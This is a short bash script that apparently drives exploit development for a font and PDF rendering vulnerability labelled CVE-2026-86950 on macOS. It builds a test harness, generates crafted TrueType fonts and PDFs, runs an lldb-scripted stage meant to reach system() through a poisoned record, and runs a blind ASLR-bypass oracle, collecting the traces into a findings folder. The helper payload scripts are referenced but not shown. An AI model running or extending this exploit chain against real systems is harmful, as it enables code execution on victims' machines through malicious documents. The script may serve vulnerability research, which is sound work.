#!/bin/bash
# RIP-38/39: gadget-stage system() exec demo + blind ASLR oracle (single run)
set -x
cd detonation/cve-2026-86950
clang -O0 -g -o render7 render7.c -framework ImageIO -framework CoreGraphics -framework CoreFoundation || exit 9
[ -x venv/bin/python ] || python3 -m venv venv
./venv/bin/pip -q install fonttools
./venv/bin/python -c "import sys; sys.path.insert(0,'.'); from gen_k2 import build_font; build_font('k2_s1000.ttf', 1000)"
./venv/bin/python gen_pdf.py k2_s1000.pdf k2_s1000.ttf
./venv/bin/python -c "import sys; sys.path.insert(0,'.'); from gen_k2 import build_font; build_font('k2_d31472.ttf', 31472)"
./venv/bin/python gen_pdf.py k2_d31472.pdf k2_d31472.ttf

# --- RIP-39: gadget stage (system() via poisoned record) ---
rm -f /tmp/rip39_id.txt rip39_trace.txt
lldb -b ./render7 -o "command script import $PWD/../cg-extract/rip39.py" > rip39_session.txt 2>&1 || true
echo "=== /tmp/rip39_id.txt ===" >> rip39_trace.txt
cat /tmp/rip39_id.txt >> rip39_trace.txt 2>/dev/null || echo "NO-FILE" >> rip39_trace.txt

# --- RIP-38: blind oracle (fresh-process rc channel, no lldb) ---
rm -f rip38_trace.txt
../cg-extract/../cve-2026-86950/venv/bin/python ../cg-extract/rip38.py > rip38_run.log 2>&1 || true
tail -5 rip38_run.log >> rip38_trace.txt 2>/dev/null || true

cd ../..
mkdir -p findings
cp detonation/cve-2026-86950/{rip39_trace.txt,rip39_session.txt,rip38_trace.txt} findings/ 2>/dev/null
ls findings/ | wc -l
echo "=== RIP-39 TRACE ==="; cat detonation/cve-2026-86950/rip39_trace.txt
echo "=== RIP-38 TRACE ==="; cat detonation/cve-2026-86950/rip38_trace.txt
